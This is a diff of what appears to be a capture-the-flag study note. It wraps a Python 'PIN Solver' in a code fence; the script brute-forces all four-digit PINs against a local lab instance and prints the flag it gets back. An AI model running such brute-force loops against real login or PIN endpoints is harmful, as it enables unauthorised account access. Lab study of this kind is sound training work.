@@ -1,7 +1,7 @@
 Possible Combinations = Character Set Size ^ Password Length
 
 ## PIN Solver
-
+```shell-session
 import requests
 
 ip = "127.0.0.1"  # Change this to your instance IP address
@@ -20,3 +20,4 @@ for pin in range(10000):
         print(f"Correct PIN found: {formatted_pin}")
         print(f"Flag: {response.json()['flag']}")
         break
+```
